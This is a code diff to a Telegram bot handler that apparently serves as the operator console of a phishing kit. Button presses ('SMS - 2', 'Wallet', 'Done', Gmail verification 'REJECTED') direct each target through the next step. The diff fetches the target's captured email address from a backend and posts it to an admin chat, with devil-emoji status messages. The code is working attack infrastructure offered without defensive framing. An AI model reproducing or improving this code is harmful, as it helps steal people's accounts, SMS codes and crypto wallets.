@@ -88,22 +88,39 @@ bot.on("callback_query", async (query) => {
           body: JSON.stringify({ verifyingId, choice: action })
         });
         
+        const result = await updateResult.json();
         console.log(`✅ Verifying choice updated: ${action}`);
+        
+        // Remove buttons from Telegram message
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {
+          console.error("Error removing buttons:", err);
+        }
         
         // Send popup
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
         
-        // Send status message to Telegram
-        let statusMsg = "";
-        if (action === "verifying_sms") {
-          statusMsg = `😈 Verifying → <b>SMS - 2</b> 💬`;
-        } else if (action === "verifying_done") {
-          statusMsg = `😈 Verifying → <b>Done</b> 🏁`;
-        } else if (action === "verifying_wallet") {
-          statusMsg = `😈 Verifying → <b>Wallet</b> 💼`;
-        }
-        
-        if (statusMsg) {
+        // Get verifying info from backend and send status message
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+          const verifyData = await verifyRes.json();
+          const verifyEmail = verifyData.email || 'unknown@example.com';
+          
+          let choiceText = '';
+          if (action === 'verifying_sms') {
+            choiceText = 'SMS - 2 💬';
+          } else if (action === 'verifying_done') {
+            choiceText = 'Done 🏁';
+          } else if (action === 'verifying_wallet') {
+            choiceText = 'Wallet 💼';
+          }
+          
+          const statusMsg = `📧 <code>${verifyEmail}</code> → <b>${choiceText}</b>`;
+          
           const botToken = process.env.BOT_TOKEN;
           const chatId = process.env.ADMIN_CHAT_ID;
           const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -117,6 +134,8 @@ bot.on("callback_query", async (query) => {
             })
           });
           console.log(`✅ Sent status message: ${statusMsg}`);
+        } catch (err) {
+          console.error("Error sending status message:", err);
         }
         
         return;
@@ -235,11 +254,11 @@ bot.on("callback_query", async (query) => {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
         console.log(`❌ GMAIL_VERIFY_REJECT matched! Message: ${statusMessage}`);
       } else if (action === "verifying_sms") {
-        statusMessage = `😈 <code>${email}</code> Verifying → <b>SMS - 2</b> 💬`;
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
       } else if (action === "verifying_done") {
-        statusMessage = `😈 <code>${email}</code> Verifying → <b>Done</b> 🏁`;
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
       } else if (action === "verifying_wallet") {
-        statusMessage = `😈 <code>${email}</code> Verifying → <b>Wallet</b> 💼`;
+        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
